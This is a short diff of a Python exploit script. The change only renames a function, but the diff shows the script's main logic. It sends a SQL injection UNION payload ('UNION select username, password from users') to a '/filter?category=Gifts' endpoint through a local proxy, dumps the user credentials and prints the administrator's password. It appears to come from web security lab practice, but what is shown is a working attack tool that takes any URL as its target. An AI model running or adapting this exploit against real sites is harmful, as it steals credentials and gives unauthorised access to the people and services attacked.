@@ -12,7 +12,7 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def get_exploit_sqli_administrator_password(url):
+def get_exploit_administrator_password(url):
     username = 'administrator'
     path = '/filter?category=Gifts'
     sql_payload = "' UNION select username, password from users--"
@@ -34,7 +34,7 @@ if __name__ == "__main__":
     try:
         url = sys.argv[1]
         print("[+] Dumping the list of usernames and passwords...")
-        administrator_password = get_exploit_sqli_administrator_password(url)
+        administrator_password = get_exploit_administrator_password(url)
         print("[+] The administrator password is '%s'" % administrator_password)
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
